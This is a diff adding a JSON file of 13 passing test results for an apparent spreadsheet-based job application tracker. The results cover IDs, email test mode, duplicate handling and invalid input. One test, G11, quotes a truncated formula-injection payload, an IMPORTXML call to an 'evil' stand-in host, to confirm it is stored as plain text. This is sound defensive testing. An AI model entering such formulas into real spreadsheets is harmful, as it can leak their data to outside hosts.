@@ -1,0 +1,84 @@
+{
+ "pass": 13,
+ "total": 13,
+ "results": [
+  {
+   "id": "G01",
+   "desc": "setupSheet writes the header row",
+   "ok": true,
+   "detail": "17 columns"
+  },
+  {
+   "id": "G02",
+   "desc": "A valid submission adds one tracker row",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "id": "G03",
+   "desc": "The application ID is HS-<year>-0001",
+   "ok": true,
+   "detail": "HS-2026-0001"
+  },
+  {
+   "id": "G04",
+   "desc": "New applications start at stage Applied with human review Pending",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "id": "G05",
+   "desc": "TEST_MODE sends the acknowledgement to the test mailbox only",
+   "ok": true,
+   "detail": "your-test-mailbox@gmail.com"
+  },
+  {
+   "id": "G06",
+   "desc": "Acknowledgement status and time are written back",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "id": "G07",
+   "desc": "The email body carries the service target and a human contact",
+   "ok": true,
+   "detail": ""
+  },
+  {
+   "id": "G08",
+   "desc": "A second identical submission is stored, flagged for a person and not rejected",
+   "ok": true,
+   "detail": "Possible duplicate (same email and role "
+  },
+  {
+   "id": "G09",
+   "desc": "The counter increments (ID 0002)",
+   "ok": true,
+   "detail": "HS-2026-0002"
+  },
+  {
+   "id": "G10",
+   "desc": "Invalid input is logged for a person and no email is sent",
+   "ok": true,
+   "detail": "Needs a person: invalid input"
+  },
+  {
+   "id": "G11",
+   "desc": "A formula typed into the form is stored as plain text",
+   "ok": true,
+   "detail": "'=IMPORTXML(\"http://evil"
+  },
+  {
+   "id": "G12",
+   "desc": "With TEST_MODE off, the email goes to the applicant (no [TEST] prefix)",
+   "ok": true,
+   "detail": "pat.demo@example.com"
+  },
+  {
+   "id": "G13",
+   "desc": "No tracker column stores protected traits",
+   "ok": true,
+   "detail": ""
+  }
+ ]
+}
